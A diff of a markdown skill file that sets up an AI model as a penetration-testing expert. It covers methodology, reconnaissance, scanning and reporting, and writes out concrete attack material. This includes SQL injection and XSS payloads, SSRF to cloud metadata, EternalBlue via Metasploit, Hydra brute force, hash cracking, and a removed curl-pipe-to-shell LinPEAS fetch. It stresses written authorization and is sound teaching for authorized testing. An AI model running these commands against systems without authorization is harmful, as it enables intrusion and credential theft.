@@ -7,144 +7,266 @@ description: "Expert penetration testing including vulnerability assessment, eth
 
 ## Overview
 
-This skill transforms you into an **Offensive Security Expert (OSCP/OSWE level)**. You will move beyond automated scanning to manual exploitation, mastering the Penetration Testing Execution Standard (PTES), advanced Web App attacks (SQLi, XSS, SSRF), privilege escalation, and writing executive-level reports.
+This skill transforms you into an **Ethical Hacking Expert**. You will master **Reconnaissance**, **Exploitation**, **Post-Exploitation**, and **Reporting** for conducting professional penetration tests.
 
 ## When to Use This Skill
 
-- Use when conducting a designated Penetration Test (Authorized)
-- Use when verifying a vulnerability finding (Proof of Concept)
-- Use when auditing an application for logic flaws
-- Use when testing API security (BOLA/IDOR)
-- Use when guiding developers on *how* an attack works
+- Use when conducting authorized security assessments
+- Use when performing vulnerability discovery
+- Use when testing web application security
+- Use when assessing network security
+- Use when writing penetration test reports
 
 ---
 
-## Part 1: Methodology (PTES)
+## Part 1: Penetration Testing Methodology
 
-Structure is what separates a Pro from a Script Kiddie.
+### 1.1 Standard Process
 
-1. **Pre-engagement**: Rules of Engagement (RoE), Scope (IPs/Domains), Timing.
-2. **Intelligence Gathering (Recon)**: Passive (OSINT) & Active (Scanning).
-3. **Threat Modeling**: Identifying high-value targets.
-4. **Vulnerability Analysis**: Finding the weak spots.
-5. **Exploitation**: Breaking in (getting a shell).
-6. **Post-Exploitation**: Looting, Pivot, Persistence (if authorized).
-7. **Reporting**: The most important part.
-
----
-
-## Part 2: Reconnaissance & Enumeration
-
-### 2.1 Subdomain Enumeration
-
-```bash
-# Passive (Amass)
-amass enum -d target.com
-
-# Active (Gobuster - Brute Force)
-gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+```
+Scope Definition → Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting
 ```
 
-### 2.2 Network Scanning (Nmap)
+### 1.2 Types of Testing
+
+| Type | Knowledge | Simulates |
+|------|-----------|-----------|
+| **Black Box** | No internal knowledge | External attacker |
+| **Gray Box** | Partial knowledge | Insider threat |
+| **White Box** | Full knowledge | Code review + testing |
+
+### 1.3 Rules of Engagement
+
+Always define:
+
+- Scope (IPs, domains, apps)
+- Testing window
+- Out-of-scope systems
+- Emergency contacts
+- Authorization documentation
+
+---
+
+## Part 2: Reconnaissance
+
+### 2.1 Passive Recon
+
+| Tool | Purpose |
+|------|---------|
+| **Shodan** | Internet-connected devices |
+| **theHarvester** | Email, subdomain collection |
+| **Recon-ng** | OSINT framework |
+| **WHOIS** | Domain registration info |
+| **Google Dorks** | Exposed files, directories |
 
 ```bash
-# The 'All-Rounder' Scan
-nmap -sC -sV -oA target_initial 192.168.1.10
-
-# The 'Full Port' Scan (Don't miss port 8080 or 8443)
-nmap -p- --min-rate 1000 192.168.1.10
+# Google Dorks examples
+site:example.com filetype:pdf
+site:example.com inurl:admin
+site:example.com "password" filetype:log
 ```
 
-### 2.3 Web Fuzzing (Ffuf)
-
-Finding hidden directories and APIs.
+### 2.2 Active Recon
 
 ```bash
-ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+# Subdomain enumeration
+subfinder -d example.com -o subdomains.txt
+
+# DNS enumeration
+dnsrecon -d example.com -t std
+
+# Port scanning
+nmap -sV -sC -oN scan.txt target.com
 ```
 
 ---
 
-## Part 3: Web Application Attacks (OWASP Top 10)
+## Part 3: Vulnerability Scanning
 
-### 3.1 SQL Injection (SQLi)
+### 3.1 Automated Scanners
 
-**Union Based:**
-`' UNION SELECT null, username, password FROM users-- -`
+| Scanner | Focus |
+|---------|-------|
+| **Nessus** | Network vulnerabilities |
+| **Nuclei** | Template-based scanning |
+| **Nikto** | Web server issues |
+| **WPScan** | WordPress security |
 
-**Error Based:**
-`' OR 1=1;-- -`
+### 3.2 Nuclei Example
 
-**Tools:** `sqlmap`
-`sqlmap -u "http://target.com/item.php?id=1" --dbs`
+```bash
+# Update templates
+nuclei -update-templates
 
-### 3.2 Server-Side Request Forgery (SSRF)
+# Scan with all templates
+nuclei -u https://example.com -t nuclei-templates/
 
-Trick the server into talking to internal resources.
-
-**Payload:** `http://target.com/webhook?url=http://169.254.169.254/latest/meta-data/` (AWS Metadata)
-
-### 3.3 Broken Object Level Authorization (BOLA / IDOR)
-
-Changing IDs to access other users' data.
-
-`GET /api/v1/users/1234` -> `GET /api/v1/users/1235` (If you see data, it's a critical finding).
-
----
-
-## Part 4: Privilege Escalation (Linux/Windows)
-
-Getting Root/System.
-
-### 4.1 Linux Enum (LinPEAS)
-
-Always run **LinPEAS** first.
-`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
-
-Common Vectors:
-
-- **SUID Binaries**: `find / -perm -4000 2>/dev/null`
-- **Sudo Rights**: `sudo -l` (Look for NOPASSWD)
-- **Kernel Exploits**: `uname -a` (DirtyCow, PwnKit)
+# Scan for specific vulnerabilities
+nuclei -u https://example.com -t cves/
+```
 
 ---
 
-## Part 5: The Report
+## Part 4: Web Application Testing
 
-A pentest is worthless without a good report.
+### 4.1 OWASP Top 10
 
-### 5.1 Structure
+| Vulnerability | Test |
+|---------------|------|
+| **Injection (A03)** | SQLi, XSS, Command injection |
+| **Broken Auth (A07)** | Session, password testing |
+| **IDOR (A01)** | Access control bypass |
+| **SSRF** | Internal service access |
+| **XXE** | XML external entities |
 
-1. **Executive Summary**: Non-technical. Risk Rating (High/Med/Low). Business Impact.
-2. **Technical Summary**: Attack narrative. Steps taken.
-3. **Findings**:
-    - **Title**: *Stored XSS in Profile Page*
-    - **Severity**: *High* (CVSS: 7.5)
-    - **Description**: *The application fails to sanitize input...*
-    - **Proof of Concept**: Screenshots with `alert(1)` popping.
-    - **Remediation**: *Implement Context-Aware Output Encoding...*
+### 4.2 Burp Suite Workflow
+
+1. Configure proxy.
+2. Spider application.
+3. Manual testing via Repeater.
+4. Scanner for automated checks.
+5. Intruder for fuzzing.
+
+### 4.3 Manual Testing Examples
+
+```bash
+# SQL Injection test
+' OR '1'='1
+' UNION SELECT NULL, username, password FROM users--
+
+# XSS test
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+
+# IDOR test
+/api/users/123  → /api/users/124
+
+# SSRF test
+http://127.0.0.1:22
+http://169.254.169.254/latest/meta-data/
+```
 
 ---
 
-## Part 6: Best Practices Checklist
+## Part 5: Network Exploitation
+
+### 5.1 Metasploit
+
+```bash
+# Start Metasploit
+msfconsole
+
+# Search for exploit
+search eternalblue
+
+# Use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.0.0.5
+set LHOST 10.0.0.1
+exploit
+```
+
+### 5.2 Password Attacks
+
+```bash
+# Hydra - SSH brute force
+hydra -l admin -P wordlist.txt ssh://10.0.0.5
+
+# Hashcat - Hash cracking
+hashcat -m 0 hashes.txt rockyou.txt
+
+# John the Ripper
+john --wordlist=rockyou.txt hashes.txt
+```
+
+---
+
+## Part 6: Post-Exploitation
+
+### 6.1 Privilege Escalation
+
+| OS | Tools |
+|----|-------|
+| **Linux** | LinPEAS, sudo -l, SUID binaries |
+| **Windows** | WinPEAS, PowerUp, mimikatz |
+
+```bash
+# Linux - Find SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# Windows - PowerUp
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+### 6.2 Persistence
+
+Document but avoid unauthorized persistence:
+
+- Scheduled tasks
+- Registry autoruns
+- SSH keys
+- Web shells
+
+### 6.3 Data Exfiltration (Demo Only)
+
+Show what an attacker could access without actually stealing data.
+
+---
+
+## Part 7: Reporting
+
+### 7.1 Report Structure
+
+| Section | Content |
+|---------|---------|
+| **Executive Summary** | Business impact, risk rating |
+| **Methodology** | Tools, approach |
+| **Findings** | Vulnerabilities with evidence |
+| **Recommendations** | Remediation steps |
+| **Appendix** | Raw data, screenshots |
+
+### 7.2 Finding Template
+
+```markdown
+## Finding: SQL Injection in Login Form
+
+**Severity:** Critical
+**CVSS:** 9.8
+
+**Description:** The login form at `/login` is vulnerable to SQL injection.
+
+**Steps to Reproduce:**
+1. Navigate to /login
+2. Enter `admin'--` as username
+3. Enter any password
+4. Authentication is bypassed
+
+**Impact:** Attacker can bypass authentication and access admin panel.
+
+**Remediation:** Use parameterized queries.
+```
+
+---
+
+## Part 8: Best Practices Checklist
 
 ### ✅ Do This
 
-- ✅ **Get Written Permission**: Never scan without a signed contract/RoE. Jail time is real.
-- ✅ **Respect Scope**: If scope is `sub.target.com`, don't touch `target.com`.
-- ✅ **Take Screenshots**: Evidence is mandatory. Screenshot every step.
-- ✅ **Clean Up**: Remove shells, user accounts, and files created during the test.
+- ✅ **Get Written Authorization**: Always. No exceptions.
+- ✅ **Document Everything**: Timestamps, screenshots, commands.
+- ✅ **Responsible Disclosure**: Report findings to stakeholders.
 
 ### ❌ Avoid This
 
-- ❌ **DoS Attacks**: Don't run aggressive scans (`--script vuln`) that crash the production server.
-- ❌ **Reporting "Clickjacking" as Critical**: Understand context. If no sensitive action, it's Low/Info.
-- ❌ **Copy-Pasting Tool Output**: Tools (Nessus/Burp) have false positives. Verify everything manually.
+- ❌ **Testing Without Permission**: It's illegal.
+- ❌ **Causing Denial of Service**: Unless explicitly scoped.
+- ❌ **Exfiltrating Real Data**: Demonstrate access, don't steal.
 
 ---
 
 ## Related Skills
 
-- `@devsecops-specialist` - Fixing what you finding
-- `@mobile-security-tester` - Mobile specific attacks
-- `@web3-smart-contract-auditor` - Blockchain attacks
+- `@red-team-operator` - Advanced adversary simulation
+- `@mobile-security-tester` - Mobile app testing
+- `@network-security-specialist` - Network defense
